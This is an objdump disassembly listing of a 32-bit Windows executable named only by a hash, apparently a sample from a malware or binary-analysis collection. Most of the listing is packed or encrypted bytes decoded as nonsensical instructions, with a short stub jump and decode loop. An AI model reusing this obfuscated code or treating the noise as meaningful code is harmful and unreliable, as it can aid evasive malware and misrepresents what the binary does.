
44e00370d0df882d0710889a1eddad674669f2c2265a512d0682394de4689764.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x98
  401009:	mov    eax,ds:0x413bde
  40100e:	mov    DWORD PTR [ebp-0x18],eax
  401011:	jmp    0x40141f
  401016:	adc    BYTE PTR [ebp+esi*8-0x5e940e36],0x54
  40101e:	(bad)  
  40101f:	shr    DWORD PTR ds:0x94cf2008,cl
  401025:	and    eax,0x7e7e7e7e
  40102a:	outs   dx,DWORD PTR ds:[esi]
  40102b:	jge    0x4010ab
  40102d:	jle    0x400ffd
  40102f:	xlat   BYTE PTR ds:[ebx]
  401030:	cmp    eax,0xcfd339d5
  401035:	rol    eax,1
  401037:	pop    es
  401038:	add    al,0x3
  40103a:	add    esp,ebp
  40103c:	add    BYTE PTR [edi],cl
  40103e:	xor    ecx,DWORD PTR [edi]
  401040:	rcr    BYTE PTR [eax],0xc7
  401043:	adc    BYTE PTR [edi],bl
  401045:	mov    ecx,0xddb70058
  40104a:	push   cs
  40104b:	out    dx,eax
  40104c:	mov    ebp,0x8e03d6db
  401051:	es mov esi,0x1541a2f4
  401057:	lods   eax,DWORD PTR ds:[esi]
  401058:	fiadd  WORD PTR [esi+0x1f]
  40105b:	data16 in al,dx
  40105d:	outs   dx,DWORD PTR ds:[esi]
  40105e:	or     edx,DWORD PTR [ecx]
  401060:	pushf  
  401061:	js     0x401039
  401063:	inc    eax
  401064:	stos   BYTE PTR es:[edi],al
  401065:	push   ebx
  401066:	sub    eax,0xad3cc4d1
  40106b:	mov    bh,BYTE PTR [ebx-0x3b]
  40106e:	stos   DWORD PTR es:[edi],eax
  40106f:	push   es
  401070:	(bad)  
  401071:	rol    DWORD PTR [ecx+0x3990d6f9],cl
  401077:	jmp    0x4010a9
  401079:	mov    ebp,ecx
  40107b:	dec    edi
  40107c:	out    0xa6,al
  40107e:	inc    ecx
  40107f:	call   DWORD PTR [edi-0x2556f868]
  401085:	mov    ebp,0x5536ed4d
  40108a:	and    esi,DWORD PTR [edx-0x43619116]
  401090:	jnp    0x4010a3
  401092:	ret    
  401093:	xchg   edx,eax
  401094:	and    esp,edx
  401096:	jmp    0x4010f6
  401098:	ret    0xb8e4
  40109b:	lock jmp 0xd765:0x74cf3192
  4010a3:	and    ch,cl
  4010a5:	add    bl,cl
  4010a7:	adc    DWORD PTR [ecx-0x5a],edx
  4010aa:	xor    eax,0x78616f03
  4010af:	or     BYTE PTR [ecx],dh
  4010b1:	fisttp QWORD PTR [esi+0x7f752854]
  4010b7:	(bad)
  4010bc:	or     ebx,DWORD PTR [ebx+0x55]
  4010bf:	fst    st(6)
  4010c1:	or     ebx,edx
  4010c3:	pop    esp
  4010c4:	fstp   DWORD PTR [ecx]
  4010c6:	jno    0x401066
  4010c8:	inc    esi
  4010c9:	dec    ebx
  4010ca:	aaa    
  4010cb:	adc    eax,0x1a29772b
  4010d0:	sar    DWORD PTR [esi],cl
  4010d2:	dec    edi
  4010d3:	call   0x42aeb5a4
  4010d8:	inc    edx
  4010d9:	inc    esp
  4010da:	or     DWORD PTR [esi],edi
  4010dc:	and    BYTE PTR [edx-0x67],cl
  4010df:	clc    
  4010e0:	lock adc BYTE PTR [esi-0x63d8be7a],bh
  4010e7:	fucomp st(5)
  4010e9:	ja     0x40115e
  4010eb:	pop    ecx
  4010ec:	push   es
  4010ed:	add    BYTE PTR [ecx],dl
  4010ef:	daa    
  4010f0:	addr16 js 0x4010ab
  4010f3:	dec    edi
  4010f4:	mov    dh,0x9e
  4010f6:	mov    ds:0x866f0f4,al
  4010fb:	scas   eax,DWORD PTR es:[edi]
  4010fc:	push   ebp
  4010fd:	xor    eax,0x513dc13c
  401102:	dec    ebp
  401103:	and    dh,cl
  401105:	retf   
  401106:	sbb    ah,BYTE PTR [eax+0x7a27d118]
  40110c:	adc    dl,BYTE PTR [esi-0x5e433e72]
  401112:	test   al,0x67
  401114:	lods   eax,DWORD PTR ds:[esi]
  401115:	mov    BYTE PTR [ebp+0x8036295],0x82
  40111c:	loope  0x401173
  40111e:	or     DWORD PTR [edx+eax*8],0xed777756
  401125:	mov    ebx,0x79dbda3d
  40112a:	lds    ebx,FWORD PTR [ecx-0x5b770dd6]
  401130:	inc    ebp
  401131:	std    
  401132:	cmp    ch,bl
  401134:	xlat   BYTE PTR ds:[ebx]
  401135:	dec    ecx
  401136:	jmp    0x6e5f:0xde95c301
  40113d:	dec    eax
  40113e:	ds shl edi,1
  401141:	inc    esi
  401142:	or     al,0x65
  401144:	adc    al,0x20
  401146:	cdq    
  401147:	pop    eax
  401148:	push   esi
  401149:	mov    al,0xaf
  40114b:	cmp    edx,DWORD PTR [esi]
  40114d:	cmp    al,0x2a
  40114f:	clc    
  401150:	mov    ds:0xed07ea99,eax
  401155:	and    bl,cl
  401157:	jmp    0x4011d5
  401159:	ret    0x66ce
  40115c:	call   0x70479a6c
  401161:	or     DWORD PTR [edx+0x7e8ccae4],ecx
  401167:	les    edx,FWORD PTR [ebx+0x44]
  40116a:	jnp    0x401102
  40116c:	sub    ecx,DWORD PTR [eax]
  40116e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40116f:	xor    BYTE PTR [edx],dl
  401171:	push   ebx
  401172:	(bad)  
  401173:	pop    ecx
  401174:	xchg   ebx,eax
  401175:	iret   
  401176:	dec    ebp
  401177:	repz ret 
  401179:	adc    eax,0xaa8d622a
  40117e:	dec    esp
  40117f:	sahf   
  401180:	mov    ecx,0x8c54861f
  401185:	xchg   DWORD PTR [ebx+ebx*8+0x6d],edi
  401189:	(bad)  
  40118a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40118b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40118c:	xor    bl,dh
  40118e:	arpl   WORD PTR [edi-0x1eb570e1],sp
  401194:	popa   
  401195:	dec    eax
  401196:	push   0x6f
  401198:	sbb    DWORD PTR [edi+0x3b],ecx
  40119b:	mov    DWORD PTR [ecx],edx
  40119d:	sbb    DWORD PTR [edi],edi
  40119f:	(bad)  
  4011a0:	cmp    BYTE PTR [edx+eax*2],dh
  4011a3:	imul   edx,eax,0xbfc8efe1
  4011a9:	jmp    0x92338e4b
  4011ae:	in     eax,0xd7
  4011b0:	lea    ecx,[edx+esi*1+0x11c1ffc5]
  4011b7:	adc    DWORD PTR [ebx+ebp*1-0x42],esi
  4011bb:	sbb    DWORD PTR [eax+0x73ddda88],edi
  4011c1:	cmc    
  4011c2:	pop    ds
  4011c3:	jnp    0x4011bd
  4011c5:	push   ss
  4011c6:	mov    edi,0x5fc1adce
  4011cb:	mov    eax,0x8c459af0
  4011d0:	sbb    ch,BYTE PTR [edx-0x4292dc3a]
  4011d6:	nop
  4011d7:	adc    eax,0x716457ee
  4011dc:	mov    ch,0x17
  4011de:	stc    
  4011df:	out    0xab,al
  4011e1:	xchg   esp,eax
  4011e2:	stos   BYTE PTR es:[edi],al
  4011e3:	push   edx
  4011e4:	adc    al,0xb0
  4011e6:	add    ecx,DWORD PTR [edi]
  4011e8:	je     0x4011a0
  4011ea:	or     DWORD PTR [esi+0x3a1bf60c],0x8520ca44
  4011f4:	repz add al,BYTE PTR [esi+0x23c69d5b]
  4011fb:	or     DWORD PTR fs:[esi],esp
  4011fe:	sub    BYTE PTR [eax+0x645760a6],bl
  401204:	cmp    BYTE PTR [ebp-0x64],dl
  401207:	popf   
  401208:	jmp    0x40120a
  40120a:	fsub   QWORD PTR [esi+0xd88ef40]
  401210:	or     edi,DWORD PTR [eax]
  401212:	jne    0x401243
  401214:	push   esp
  401215:	loopne 0x4011fc
  401217:	call   0x73e6:0x6467e0ca
  40121e:	loop   0x4011d6
  401220:	jl     0x40123e
  401222:	int3   
  401223:	dec    eax
  401224:	jne    0x401283
  401226:	adc    DWORD PTR [eax],ebx
  401228:	xor    al,dh
  40122a:	adc    DWORD PTR [ecx-0x5f],edx
  40122d:	jne    0x4012a2
  40122f:	and    bl,bh
  401231:	push   eax
  401232:	rcr    DWORD PTR [edx-0x9],cl
  401235:	je     0x401240
  401237:	mov    dl,0xb1
  401239:	data16 scas al,BYTE PTR es:[edi]
  40123b:	add    bh,BYTE PTR [edx]
  40123d:	mov    ah,0xa9
  40123f:	sbb    eax,0x10ed6e90
  401244:	fsub   DWORD PTR [edi]
  401246:	mov    ah,0x28
  401248:	mov    edi,0xb8770c50
  40124d:	fsubr  DWORD PTR [eax+0x58]
  401250:	xor    bl,BYTE PTR [ebp+0x48]
  401253:	int    0x2b
  401255:	adc    eax,0xd98e62db
  40125a:	lods   eax,DWORD PTR ds:[esi]
  40125b:	sahf   
  40125c:	jns    0x40123e
  40125e:	dec    edx
  40125f:	jmp    0x4012cb
  401261:	cmc    
  401262:	cmc    
  401263:	repnz ds and eax,0xa4aefd28
  40126a:	adc    al,0xfe
  40126c:	and    DWORD PTR [ebx+0x50],eax
  40126f:	(bad)  [ecx+0xb]
  401272:	jo     0x4011fd
  401274:	adc    ch,cl
  401276:	pushf  
  401277:	xor    bl,BYTE PTR [ecx+0x500e5ae1]
  40127d:	xor    eax,0x871ab19
  401282:	add    BYTE PTR [eax-0x35],dh
  401285:	pop    ebx
  401286:	sbb    edi,ebp
  401288:	push   0xc28404ce
  40128d:	fdivr  DWORD PTR [eax-0x66]
  401290:	leave  
  401291:	daa    
  401292:	lea    esp,[eax+ebp*1+0x7beadee4]
  401299:	push   eax
  40129a:	(bad)  
  40129c:	fiadd  DWORD PTR [ecx+0x5e]
  40129f:	xor    esp,DWORD PTR [esi-0x9]
  4012a2:	scas   eax,DWORD PTR es:[edi]
  4012a3:	mov    WORD PTR [eax],cs
  4012a5:	or     esp,DWORD PTR [ecx]
  4012a7:	mov    esp,0x69bd43e7
  4012ac:	arpl   WORD PTR [edx-0x30],ax
  4012af:	jmp    0x9e41:0xcb3bb34a
  4012b6:	pop    ebx
  4012b7:	pop    esi
  4012b8:	mov    dl,0x3a
  4012ba:	fstp   TBYTE PTR [edi]
  4012bc:	int    0xfa
  4012be:	mov    ah,0xae
  4012c0:	cmp    DWORD PTR [eax+0x7e7611cd],esi
  4012c6:	inc    edi
  4012c7:	xor    BYTE PTR [ecx],0x62
  4012ca:	rcr    ebx,cl
  4012cc:	bound  ecx,QWORD PTR [ebx+edi*4-0x1c]
  4012d0:	sbb    eax,0xb479580f
  4012d5:	mov    ecx,0xdd13cef9
  4012da:	mov    ecx,0x8c1a9d9c
  4012df:	push   ecx
  4012e0:	retf   0x6748
  4012e3:	fisttp DWORD PTR [eax-0x1b]
  4012e6:	push   esi
  4012e7:	mov    edi,0x367fee88
  4012ec:	shr    BYTE PTR [esi-0xc],cl
  4012ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4012f0:	sub    DWORD PTR [eax],edx
  4012f2:	stos   DWORD PTR es:[edi],eax
  4012f3:	jae    0x4012e4
  4012f5:	push   esi
  4012f6:	cld    
  4012f7:	test   BYTE PTR [esi-0x276185f4],0xd9
  4012fe:	or     DWORD PTR ds:0xac1407e2,0xffffffcd
  401305:	mov    ebx,0x41572648
  40130a:	lds    ebp,FWORD PTR [esi-0xa]
  40130d:	cmp    ah,BYTE PTR [edx+0x727adf67]
  401313:	sti    
  401314:	and    BYTE PTR [esi+0x3d],bh
  401317:	adc    edi,edi
  401319:	mov    dh,0xc0
  40131b:	and    ch,BYTE PTR [eax]
  40131d:	mov    cl,0xde
  40131f:	fnstenv [edi]
  401321:	adc    DWORD PTR [ebp+0x45c8a8fd],eax
  401327:	xor    ah,BYTE PTR [ebx]
  401329:	add    ebx,DWORD PTR [edx+ebp*8]
  40132c:	mov    ?,ebx
  40132e:	mov    bh,0x55
  401330:	outs   dx,DWORD PTR ds:[esi]
  401331:	dec    ecx
  401332:	or     dl,0x33
  401335:	sbb    dh,BYTE PTR [ecx-0x53]
  401338:	js     0x401344
  40133a:	push   cs
  40133b:	sbb    DWORD PTR [ebp-0x1f18a5b7],esi
  401341:	sbb    eax,0x62233c05
  401346:	xchg   ebx,eax
  401347:	jnp    0x4013b5
  401349:	mov    ebp,0x1f31a760
  40134e:	stos   DWORD PTR es:[edi],eax
  40134f:	jmp    0x4e6e:0xe4cb4d2a
  401356:	jns    0x4012ff
  401358:	ror    BYTE PTR [edx],cl
  40135a:	(bad)  
  40135c:	(bad)  
  40135d:	sub    DWORD PTR [eax],eax
  40135f:	mov    db5,esp
  401362:	cwde   
  401363:	loop   0x401327
  401365:	pop    edi
  401366:	jne    0x4012f0
  401368:	or     DWORD PTR [eax+0x5a6c2bfc],0x805396aa
  401372:	add    eax,0x4cf95ba8
  401377:	fstp   QWORD PTR [eax+0x2b601519]
  40137d:	fcom   DWORD PTR [ecx+ebx*4]
  401380:	mov    edx,0xbd05b91b
  401385:	mov    ecx,0xc08dd4c2
  40138a:	jge    0x4013c7
  40138c:	dec    edx
  40138d:	jo     0x40134c
  40138f:	xchg   DWORD PTR [esi+0x5c],edi
  401392:	mov    eax,0x26f970d4
  401397:	push   edx
  401398:	nop
  401399:	cs ret 0x3ea2
  40139d:	or     eax,0xbeb2747
  4013a2:	shl    BYTE PTR [esi*8-0x217223e1],0x9a
  4013aa:	aaa    
  4013ab:	inc    esp
  4013ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4013ad:	fidivr DWORD PTR [ebp+0x4]
  4013b0:	into   
  4013b1:	adc    DWORD PTR [ebp-0x4c],esi
  4013b4:	stos   DWORD PTR es:[edi],eax
  4013b5:	outs   dx,BYTE PTR ds:[esi]
  4013b6:	lock sbb al,0xac
  4013b9:	(bad)  
  4013ba:	add    eax,0x35bceba6
  4013bf:	cmp    bl,bh
  4013c1:	dec    edx
  4013c2:	pop    ecx
  4013c3:	bound  eax,QWORD PTR [eax+0x50d7f010]
  4013c9:	cdq    
  4013ca:	pop    ss
  4013cb:	pusha  
  4013cc:	xchg   ebp,ebx
  4013ce:	ins    BYTE PTR es:[edi],dx
  4013cf:	push   esp
  4013d0:	xchg   esp,eax
  4013d1:	hlt    
  4013d2:	xchg   ebp,eax
  4013d3:	and    BYTE PTR ds:0xee4cc70e,dl
  4013d9:	push   ds
  4013da:	pop    ecx
  4013db:	push   ds
  4013dc:	jp     0x40140a
  4013de:	xor    BYTE PTR [ecx-0x3],al
  4013e1:	test   eax,0x836bece3
  4013e6:	pop    ss
  4013e7:	and    cl,BYTE PTR [ecx+edi*4+0x1c176ca0]
  4013ee:	mov    bl,0x36
  4013f0:	ret    0xcaf5
  4013f3:	push   ebx
  4013f4:	jg     0x4013a4
  4013f6:	call   0x28ec92d9
  4013fb:	xchg   esi,eax
  4013fc:	test   BYTE PTR [esi+0x2f],bl
  4013ff:	adc    DWORD PTR [edi-0x2dfe53e7],esi
  401405:	out    dx,al
  401406:	xor    DWORD PTR [esi+ecx*1-0x1c698cc2],0xffffffec
  40140e:	xchg   ebx,eax
  40140f:	pop    edx
  401410:	inc    BYTE PTR [ebx+0x2b]
  401413:	sub    ebp,DWORD PTR [esi+0x2a74b41f]
  401419:	inc    ebx
  40141a:	jns    0x4013a1
  40141c:	push   es
  40141d:	add    edx,ebp
  40141f:	mov    eax,ds:0x413cee
  401424:	mov    DWORD PTR [ebp-0x48],eax
  401427:	mov    DWORD PTR [ebp-0x10],0xf89c8531
  40142e:	adc    eax,0x6013
  401433:	mov    DWORD PTR [ebp-0x1c],0xf89c8532
  40143a:	adc    eax,ecx
  40143c:	mov    eax,DWORD PTR [ebp-0x10]
  40143f:	mov    ecx,DWORD PTR ds:0x43374b
  401445:	mov    ecx,DWORD PTR [ecx]
  401447:	or     DWORD PTR ds:0x433773,ecx
  40144d:	push   ebx
  40144e:	push   esi
  40144f:	sbb    DWORD PTR ds:0x4337eb,edi
  401455:	mov    esi,0x7510854
  40145a:	movzx  ecx,BYTE PTR ds:0x4337f3
  401461:	sbb    DWORD PTR ds:0x4337ef,ecx
  401467:	xor    eax,esi
  401469:	and    ebx,ecx
  40146b:	push   edi
  40146c:	mov    DWORD PTR ds:0x433843,0x1c
  401476:	cmp    DWORD PTR ds:0x433843,0x0
  40147d:	je     0x4014ab
  401483:	cmp    DWORD PTR ds:0x433843,0x25
  40148a:	jne    0x401499
  401490:	push   DWORD PTR [ebp-0x20]
  401493:	call   DWORD PTR ds:0x412288
  401499:	mov    ebx,DWORD PTR ds:0x433843
  40149f:	dec    ebx
  4014a0:	mov    DWORD PTR ds:0x433843,ebx
  4014a6:	jmp    0x401476
  4014ab:	mov    edi,0x32729b
  4014b0:	jmp    0x4018be
  4014b5:	xchg   ecx,eax
  4014b6:	mov    ds:0x59f479c4,eax
  4014bb:	push   ecx
  4014bc:	mov    bl,0x68
  4014be:	push   ebp
  4014bf:	out    dx,eax
  4014c0:	xor    ebx,DWORD PTR [ecx+0x6f9ac47e]
  4014c6:	jge    0x401546
  4014c8:	jle    0x401539
  4014ca:	jge    0x40154a
  4014cc:	jle    0x40153a
  4014ce:	mov    edx,DWORD PTR [edx-0x310dda9b]
  4014d4:	mov    esp,0x3253b5a0
  4014d9:	sub    edx,DWORD PTR [eax-0x5d]
  4014dc:	int3   
  4014dd:	sub    al,0x75
  4014df:	arpl   WORD PTR [edx],ax
  4014e1:	js     0x4014e8
  4014e3:	lahf   
  4014e4:	fist   DWORD PTR [esi-0x16f491e4]
  4014ea:	mov    bl,BYTE PTR [ebp+esi*4-0x2f9e770b]
  4014f1:	stos   BYTE PTR es:[edi],al
  4014f2:	mov    edx,0xaccd8ee7
  4014f7:	int    0x52
  4014f9:	xor    DWORD PTR [ecx+ebp*8+0x60],edi
  4014fd:	stos   BYTE PTR es:[edi],al
  4014fe:	adc    al,0xc5
  401500:	cmp    bl,BYTE PTR [eax+0x6b]
  401503:	mov    bl,0xb3
  401505:	adc    ebp,0x67
  401508:	push   es
  401509:	and    al,0x4d
  40150b:	dec    edi
  40150c:	xor    al,0xe
  40150e:	mov    ebx,0xd4904a53
  401513:	fs ins DWORD PTR es:[edi],dx
  401515:	out    0x6a,eax
  401517:	or     BYTE PTR [edi],dh
  401519:	pop    esi
  40151a:	loope  0x4014fc
  40151c:	add    al,0x92
  40151e:	imul   esi,DWORD PTR [ecx+edi*2-0x59],0x50799df8
  401526:	retf   
  401527:	jo     0x401593
  401529:	dec    BYTE PTR [edi+0x2a]
  40152c:	shl    BYTE PTR [ecx],1
  40152e:	lock push ecx
  401530:	daa    
  401531:	mov    esi,0x61136919
  401536:	add    al,0x81
  401538:	test   BYTE PTR [eax-0x37],0xd4
  40153c:	es in  al,0x73
  40153f:	sub    ch,BYTE PTR ds:0x5e34b4e5
  401545:	cmc    
  401546:	mov    eax,ds:0x3ab27a50
  40154b:	jne    0x401571
  40154d:	cmc    
  40154e:	lahf   
  40154f:	push   ss
  401550:	add    eax,0xa8e40acc
  401555:	dec    edi
  401556:	sbb    al,0xb3
  401558:	jle    0x4014db
  40155a:	repz loopne 0x4014e9
  40155d:	dec    ecx
  40155e:	adc    esi,DWORD PTR [edx+ebp*1]
  401561:	pusha  
  401562:	mov    ah,0xf1
  401564:	xchg   edx,eax
  401565:	arpl   bp,dx
  401567:	add    eax,0x92a734fb
  40156c:	outs   dx,DWORD PTR ds:[esi]
  40156d:	pop    ss
  40156e:	outs   dx,DWORD PTR ds:[esi]
  40156f:	push   0x653d1560
  401574:	call   0x24c0:0xa90d9f0c
  40157b:	inc    edi
  40157c:	ins    DWORD PTR es:[edi],dx
  40157d:	rep ins DWORD PTR es:[edi],dx
  40157f:	ins    DWORD PTR es:[edi],dx
  401580:	ror    BYTE PTR [esp+eax*2-0x3c],1
  401584:	clts   
  401586:	jno    0x4015d4
  401588:	mov    ebp,ebx
  40158a:	jne    0x401514
  40158c:	in     al,0x7
  40158e:	pop    ecx
  40158f:	out    0x8a,ax
  401592:	add    dl,dl
  401594:	mov    ds:0xd500bfcb,al
  401599:	mov    esp,0x9bed0159
  40159e:	addr16 push edx
  4015a0:	rol    DWORD PTR [ebp-0x76],0x67
  4015a4:	test   ebx,ecx
  4015a6:	test   al,0x86
  4015a8:	mov    al,ds:0x7e9e348f
  4015ad:	jns    0x401547
  4015af:	(bad)  
  4015b0:	iret   
  4015b1:	and    dl,BYTE PTR [edx+edx*8]
  4015b4:	ins    DWORD PTR es:[edi],dx
  4015b5:	inc    esi
  4015b6:	inc    edi
  4015b7:	push   edx
  4015b8:	push   es
  4015b9:	stos   DWORD PTR es:[edi],eax
  4015ba:	adc    eax,DWORD PTR [edx]
  4015bc:	add    al,0x3a
  4015be:	pop    ds
  4015bf:	ja     0x401603
  4015c1:	mov    DWORD PTR [ecx+0x8],edi
  4015c4:	ds jge 0x4015b7
  4015c7:	sbb    ebp,DWORD PTR [edx-0x74]
  4015ca:	xor    DWORD PTR [ebp-0x3c],ecx
  4015cd:	mov    bl,0xec
  4015cf:	push   es
  4015d0:	fadd   QWORD PTR [eax+eax*2-0x15fc3a0c]
  4015d7:	pushf  
  4015d8:	xor    eax,0x43d93b75
  4015dd:	push   ebp
  4015de:	jo     0x401612
  4015e0:	jno    0x401571
  4015e2:	out    0xfe,eax
  4015e4:	mov    ch,0x1b
  4015e6:	ins    BYTE PTR es:[edi],dx
  4015e7:	and    edi,DWORD PTR [ebp+edx*2+0x7]
  4015eb:	and    eax,0x348f1144
  4015f0:	cmp    eax,0x5e87c361
  4015f5:	hlt    
  4015f6:	inc    edx
  4015f7:	ror    BYTE PTR [ebp-0x5],0xb8
  4015fb:	xor    ah,BYTE PTR [esi+ebp*2+0x5f]
  4015ff:	mov    bh,0xad
  401601:	repz les edi,FWORD PTR [edi]
  401604:	stos   DWORD PTR es:[edi],eax
  401605:	add    ebp,esp
  401607:	leave  
  401608:	adc    al,0x33
  40160a:	inc    DWORD PTR [ebx+0x711975e9]
  401610:	xor    DWORD PTR [edx+0x64],esi
  401613:	mov    WORD PTR [edx+ecx*1-0x6ade820c],ds
  40161a:	jae    0x4015f6
  40161c:	xlat   BYTE PTR ds:[ebx]
  40161d:	js     0x401616
  40161f:	(bad)  
  401620:	sbb    al,0xb7
  401622:	outs   dx,BYTE PTR ds:[esi]
  401623:	dec    eax
  401624:	fstp   QWORD PTR [ebx-0xd1df5]
  40162a:	leave  
  40162b:	mov    ebx,0xd3ed98bc
  401630:	xor    eax,ecx
  401632:	loop   0x40163b
  401634:	xor    dh,BYTE PTR [ebx]
  401636:	es pop esi
  401638:	lock mov bl,0x59
  40163b:	add    BYTE PTR [ebp+edi*8-0xa],ch
  40163f:	retf   
  401640:	pop    esi
  401641:	aad    0xab
  401643:	and    DWORD PTR [ecx-0x6c],0x7f466023
  40164a:	mov    ecx,0xec096167
  40164f:	arpl   WORD PTR [ebx],di
  401651:	ret    0xf984
  401654:	cld    
  401655:	cmp    DWORD PTR [eax+edx*2-0x48016b72],ebp
  40165c:	xchg   edx,eax
  40165d:	sub    BYTE PTR [ebx],0x61
  401660:	cld    
  401661:	ins    BYTE PTR es:[edi],dx
  401662:	jecxz  0x401692
  401664:	not    BYTE PTR [edi]
  401666:	adc    DWORD PTR [ebx],ebx
  401668:	xchg   edx,eax
  401669:	mov    dh,0x84
  40166b:	xchg   BYTE PTR [ecx-0x38],cl
  40166e:	outs   dx,BYTE PTR ds:[esi]
  40166f:	fwait
  401670:	aad    0xff
  401672:	sub    eax,ecx
  401674:	dec    ecx
  401675:	les    edx,FWORD PTR [ebp-0x3ad6ff2b]
  40167b:	xor    ecx,DWORD PTR [eax-0x63]
  40167e:	stos   DWORD PTR es:[edi],eax
  40167f:	dec    edx
  401680:	inc    esp
  401681:	mov    ds:0xc44417fe,eax
  401686:	leave  
  401687:	rol    BYTE PTR [eax+0x46],1
  40168a:	push   esp
  40168b:	dec    ecx
  40168c:	in     eax,0x1c
  40168e:	and    eax,0x68f02dc0
  401693:	pop    ss
  401694:	adc    BYTE PTR [ebx+0x6f79f47],bh
  40169a:	jl     0x4016a6
  40169c:	push   edx
  40169d:	cmp    ch,ah
  40169f:	dec    ebp
  4016a0:	xlat   BYTE PTR ds:[ebx]
  4016a1:	les    esi,FWORD PTR [eax]
  4016a3:	rcl    BYTE PTR [eax+0x17],cl
  4016a6:	cmp    BYTE PTR [ebx],dh
  4016a8:	lds    esi,FWORD PTR [eax+0x3e]
  4016ab:	mov    dl,0xf9
  4016ad:	ds dec DWORD PTR fs:0x37ecca65
  4016b5:	sbb    eax,0x1eb305fa
  4016ba:	test   eax,0xfb52781a
  4016bf:	ins    DWORD PTR es:[edi],dx
  4016c0:	cmp    ebx,edx
  4016c2:	leave  
  4016c3:	inc    edi
  4016c4:	lods   al,BYTE PTR ds:[esi]
  4016c5:	adc    al,0xeb
  4016c7:	push   eax
  4016c8:	aam    0x85
  4016ca:	dec    bp
  4016cc:	xor    ah,BYTE PTR [esi-0x75]
  4016cf:	out    dx,al
  4016d0:	rcr    DWORD PTR [edx-0x22],1
  4016d3:	test   BYTE PTR [edi+edx*2+0x46fa615d],ah
  4016da:	test   BYTE PTR [esi],ah
  4016dc:	sub    eax,0xbd2dc67a
  4016e1:	into   
  4016e2:	std    
  4016e3:	fild   QWORD PTR [edi]
  4016e5:	clc    
  4016e6:	outs   dx,BYTE PTR ds:[esi]
  4016e7:	inc    edx
  4016e8:	fild   DWORD PTR [edi]
  4016ea:	and    ecx,DWORD PTR [ebx]
  4016ec:	dec    esi
  4016ed:	xlat   BYTE PTR ds:[ebx]
  4016ee:	add    ebp,DWORD PTR ds:0x6a73e1e0
  4016f4:	ficom  WORD PTR [eax+esi*4-0x10a08d65]
  4016fb:	add    DWORD PTR [ebx-0x64b25f0e],0xffffffce
  401702:	xchg   ebp,eax
  401703:	add    al,0x6e
  401705:	cmc    
  401706:	mov    eax,ds:0x8f52061
  40170b:	iret   
  40170c:	mov    eax,ds:0xf2f1d251
  401711:	and    DWORD PTR [esi+0x33],eax
  401714:	daa    
  401715:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401716:	xchg   DWORD PTR [eax],esi
  401718:	test   al,cl
  40171a:	pusha  
  40171b:	not    BYTE PTR [edi-0x3812239f]
  401721:	push   ss
  401722:	mov    ecx,0x294c4302
  401727:	adc    esp,DWORD PTR [eax-0x1362c6b4]
  40172d:	jmp    0x62fc:0x3fd4c1aa
  401734:	push   esp
  401735:	sub    cl,BYTE PTR [ebx]
  401737:	and    BYTE PTR [esi+0x37],ch
  40173a:	cmc    
  40173b:	push   ebp
  40173c:	test   BYTE PTR [edx+0x1c],bh
  40173f:	sbb    al,0x9b
  401741:	test   cl,bl
  401743:	cdq    
  401744:	jae    0x4017b2
  401746:	sbb    cl,BYTE PTR [esi+0x7a11e7af]
  40174c:	mov    bl,0x11
  40174e:	fdivp  st(2),st
  401750:	data16 outs dx,BYTE PTR ds:[esi]
  401752:	pushf  
  401753:	in     al,dx
  401754:	adc    BYTE PTR [esi+esi*1],al
  401757:	xor    esp,ebx
  401759:	lds    esi,FWORD PTR [edx+edi*8+0x2541d96a]
  401760:	mov    esp,0x50603a8
  401765:	push   esp
  401766:	adc    BYTE PTR [ecx-0x79],0x6e
  40176a:	xor    al,0x23
  40176c:	rcl    ecx,0xe4
  40176f:	fild   DWORD PTR [esi+0x32]
  401772:	mov    esi,edx
  401774:	or     cl,BYTE PTR [eax]
  401776:	mov    ah,0xbc
  401778:	retf   0x5082
  40177b:	mov    dh,0xd
  40177d:	adc    edi,edx
  40177f:	loop   0x401779
  401781:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401782:	xor    DWORD PTR cs:[eax+0x6],edi
  401786:	jecxz  0x401792
  401788:	mov    ecx,0xb6e8a127
  40178d:	jmp    0x4c7a:0xe2688704
  401794:	mov    ebx,0xc8b4911d
  401799:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40179a:	push   0xbb8047ed
  40179f:	push   esp
  4017a0:	push   cs
  4017a1:	pop    esp
  4017a2:	jbe    0x401815
  4017a4:	(bad)  
  4017a6:	int3   
  4017a7:	cmp    ah,dh
  4017a9:	dec    edx
  4017aa:	xor    al,0xc5
  4017ac:	lea    ebp,[ecx+eiz*4]
  4017af:	push   ss
  4017b0:	push   edi
  4017b1:	pop    edx
  4017b2:	mov    ecx,ebx
  4017b4:	sbb    BYTE PTR [esi+edx*2+0x68],ch
  4017b8:	nop
  4017b9:	jmp    0xd8900e91
  4017be:	xor    eax,0x3c90c58a
  4017c3:	dec    eax
  4017c4:	pop    ds
  4017c5:	pop    ebx
  4017c6:	lods   eax,DWORD PTR ds:[esi]
  4017c7:	lahf   
  4017c8:	into   
  4017c9:	mov    ds:0xb87b269d,al
  4017ce:	add    edx,DWORD PTR [edx-0x2336a98f]
  4017d4:	retf   0xa2a9
  4017d7:	xor    eax,0xef386f5d
  4017dc:	inc    esi
  4017dd:	ins    DWORD PTR es:[edi],dx
  4017de:	call   0xf572:0xb411346f
  4017e5:	test   BYTE PTR [edx],bl
  4017e7:	cmp    ebp,DWORD PTR [esi+0x55d3dd6a]
  4017ed:	retf   
  4017ee:	mov    ah,0x56
  4017f0:	popf   
  4017f1:	imul   eax,DWORD PTR [ecx+eax*8],0xfde4ce2e
  4017f8:	iret   
  4017f9:	jl     0x40182f
  4017fb:	imul   BYTE PTR ds:0xa73da778
  401801:	dec    ebp
  401802:	jnp    0x4017cb
  401804:	arpl   WORD PTR [ecx+0x75],si
  401807:	cmp    bl,0xb
  40180a:	xchg   ebx,edx
  40180c:	cmc    
  40180d:	add    ecx,edi
  40180f:	xchg   edi,eax
  401810:	sub    ch,BYTE PTR [edx]
  401812:	pop    ds
  401813:	adc    BYTE PTR [ebp+0x79],dl
  401816:	dec    esp
  401817:	in     al,0x48
